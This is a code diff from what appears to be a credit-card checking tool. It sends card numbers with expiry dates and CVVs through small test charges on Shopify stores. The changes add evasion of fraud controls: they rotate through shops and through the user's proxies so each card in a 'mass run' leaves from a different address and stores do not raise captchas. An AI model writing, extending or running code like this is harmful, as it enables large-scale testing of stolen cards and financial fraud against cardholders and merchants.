@@ -147,15 +147,10 @@ async def call_shopify_api(cc, mm, yy, cvv, site=None, proxy=None, timeout=120,
     import aiohttp
 
     t0 = time.time()
-    # The shop that answered last is asked first.  The validator takes
-    # a list of shops and tries them in one request, so the good one
-    # goes at the front and the others follow if it is having a bad
-    # day.
-    if site:
-        shops = [site]
-    else:
-        good = _read_good_site()
-        shops = [good] if good else []
+    # The shop that answered last is not named here.  The validator gives
+    # every shop a turn and puts the shops that answer first, so one shop
+    # does not get every card of a mass run and put up a captcha.
+    shops = [site] if site else []
 
     params = {
         "site": ",".join(shops),
@@ -355,9 +350,13 @@ async def shopify_api_check_1_2(cc, mm, yy, cvv, site=None, proxy=None, user_id=
     then a real one and never "no products".
     """
     last = None
+    # The user's own proxies, all of them, so every card leaves from a
+    # different address.  One address for the whole run is what makes the
+    # stores put up a captcha.
+    proxy_list = _proxy_list_for(user_id)
     for low, high in ((SHOPIFY_MIN_PRICE, SHOPIFY_MAX_PRICE), (0.50, 2.00)):
         result = await call_shopify_api(
-            cc, mm, yy, cvv, site=site, proxy=proxy,
+            cc, mm, yy, cvv, site=site, proxy=(proxy_list or proxy),
             timeout=kwargs.get("timeout") or SHOPIFY_API_TIMEOUT,
             price_min=low, price_max=high,
         )
